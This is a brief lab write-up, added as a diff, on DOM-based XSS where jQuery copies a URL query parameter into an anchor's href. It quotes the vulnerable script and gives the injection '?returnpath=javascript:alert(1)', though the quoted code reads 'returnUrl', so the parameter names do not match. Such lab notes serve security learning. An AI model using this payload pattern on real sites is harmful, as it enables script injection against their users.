@@ -1,0 +1,12 @@
+// Lab: DOM XSS in jQuery anchor href attribute sink using location.search source
+
+Inspect in submit feedback form at back option, where we find 
+<script>
+ $(function() {
+	$('#backLink').attr("href",(new URLSearchParams(window.location.search)).get('returnUrl'));
+});
+</script>
+
+and in the url ?returnpath= we inject 
+
+?returnpath=javascript:alert(1)
